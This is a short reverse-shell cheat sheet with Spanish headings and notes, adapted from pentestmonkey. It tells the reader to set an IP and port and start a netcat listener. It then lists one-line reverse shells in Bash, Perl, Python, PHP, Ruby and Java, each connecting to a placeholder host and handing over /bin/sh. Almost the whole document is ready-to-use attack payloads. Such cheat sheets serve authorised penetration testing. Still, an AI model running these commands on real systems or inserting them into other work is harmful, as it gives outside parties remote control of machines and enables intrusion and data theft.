# Reverse Shell Cheat Sheet

> [!IMPORTANT]
> Define el $IP y $PORT antes de usar los comandos.
> Iniciar escucha con `nc -lvnp $PORT`

## Bash

```bash
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

## Perl

```perl
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

```php
php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Menciones

Se ha usado la [Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) como referencia.